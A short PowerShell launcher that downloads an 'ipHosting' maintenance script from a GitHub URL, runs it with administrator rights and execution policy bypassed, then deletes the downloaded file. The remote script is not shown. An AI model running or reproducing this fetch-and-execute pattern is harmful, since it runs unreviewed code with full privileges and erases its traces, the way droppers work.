$r = 'https://raw.githubusercontent.com/henriqueguape-max/iphosting-kit/main/ipHosting-Manutencao.ps1'
$t = Join-Path $env:TEMP 'iphosting.ps1'
(New-Object Net.WebClient).DownloadFile($r, $t)
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$t`"" -Verb RunAs
Start-Sleep 8
Remove-Item $t -ErrorAction SilentlyContinue
